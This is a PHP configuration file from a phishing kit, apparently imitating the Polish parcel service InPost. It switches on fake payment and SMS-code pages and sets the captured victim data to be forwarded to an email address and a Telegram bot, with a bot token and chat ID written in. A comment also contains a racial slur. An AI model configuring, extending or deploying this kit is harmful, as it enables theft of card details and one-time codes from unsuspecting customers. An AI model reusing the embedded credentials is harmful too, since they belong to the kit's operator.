<?php

/*   
		██████████          ███████       █████████    █████       █████ ████████         
		░░███░░░░░█         ░░░░░███      ███░░░░░███ ███░░░███    ░░███ ███░░░░███        
		░███  █ ░█████ ████████░███     ███     ░░░ ███   ░░███ ███████░░░    ░██████████ 
		░██████ ░░███ ░░██░░███░███    ░███        ░███    ░██████░░███   ██████░░███░░███
		░███░░█  ░███  ░███░███░███    ░███        ░███    ░██░███ ░███  ░░░░░░██░███ ░░░ 
		░███ ░   ░░███ ███ ░███░███    ░░███     ██░░███   ███░███ ░███ ███   ░██░███     
		██████████░░█████  █████████    ░░█████████ ░░░█████░ ░░███████░░█████████████    
		░░░░░░░░░░  ░░░░░  ░░░░░░░░░      ░░░░░░░░░    ░░░░░░   ░░░░░░░░ ░░░░░░░░░░░░░    
		
		
		ICQ & TELEGRAM : @evilcoder1337
*/
	# Evil C0d3r PAGE CONFIG FILE #
	
	$ExitLink = 'https://inpost.pl/'; // REDIRECT LINK HERE . . .

	$save_result_txt = "no";
	$show_payment_page ="yes";
	$show_sms_page1 ="yes";
	$show_sms_page2 ="yes";
	$show_thanks_page ="yes";


// ================================= //
	/*  Send Result To Email	 */
	
	$mail = "";  //  EMAIL HERE .

// ================================= //
	/*  Send Result To TELEGRAM BOT */
	
    $bot_result = "yes"; // Result to your telegram bot true/false
	$botkey = "8306147363:AAFP2kkAJiTKw_unZ0pjnWV8D7rbFT9xb4"; // TELEGRAM BOT KEY FROM @botfather
    $teleid = "-4849942953"; // Your Numric Telegram UserID
    $bot = "https://api.telegram.org/bot".$botkey."/sendMessage?chat_id=".$teleid."&parse_mode=Markdown&";  // Do Not Edit This Shit Nigga xD"
	
	$key = "1T1hE9XTKxb4yVBcwAgpN79sbAGvckiF"; // Your Key api protection DON't CHANGE IT BRO ...
?>